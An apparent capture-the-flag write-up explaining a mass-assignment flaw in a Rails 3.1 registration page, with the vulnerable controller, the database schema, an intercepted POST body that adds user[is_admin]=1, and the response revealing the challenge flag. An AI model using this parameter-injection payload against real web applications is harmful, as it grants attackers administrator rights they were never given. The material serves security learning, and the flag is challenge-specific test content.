# Massive Fail - 120

```
Fed up with their recent PHP related issues, Daedalus Corp. has switched their website to run on Ruby on Rails (version 3.1.0) instead. Their brand new registration page does not seem like much of an improvement though... [Source].
```

Another web challenge which I really do not like but this one was not that bad.

Hints:The source code files app/controllers/user_controller.rb and db/schema.rb are particularly interesting.

I downloaded the file and saw the source code:

```
class UserController < ApplicationController
  def register     
  end

  def create
    # User.new creates a new user according to ALL the parameters
    @new_user = User.new(params[:user])
    @new_user.save
  end
end

/Users/Danny/Downloads/daedalus/db/schema
s file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It`s strongly recommended to check this file into your version control system.

ActiveRecord::Schema.define(:version => 20141008175655) do

  create_table "users", :force => true do |t|
    t.string   "username"
    t.string   "password"
    t.string   "name"
    t.boolean  "is_admin"
    t.datetime "created_at"
    t.datetime "updated_at"
  end
end
```

Note:
* It creates the user according to the parameter. This means we can supply more parameters.
* if we can set is_admin to true, then we can login as a admin and get the flag.

I used burpsuit to intercept and change the parameter:

```
//original
utf8=%E2%9C%93&authenticity_token=CWLvj9dSzplMD26pvqYbNzQF8aNJU9agNoUAtCYqCZc%3D&user%5Bname%5D=hello&user%5Busername%5D=ass&user%5Bpassword%5D=aaa&commit=Register 

//My payload
utf8=&authenticity_token=AoWUyax4REP8QNlLPiN3jpLsXXjSPtco9VgAMgWrlQQ=&user[name]=asdf&user[username]=asdf&user[password]=asdf1&user[is_admin]=1&commit=Register
```

Response:

```
Registration Complete!
Welcome asdf!

You`re an admin, so you get to know the secret code: no_framework_is_without_sin
```



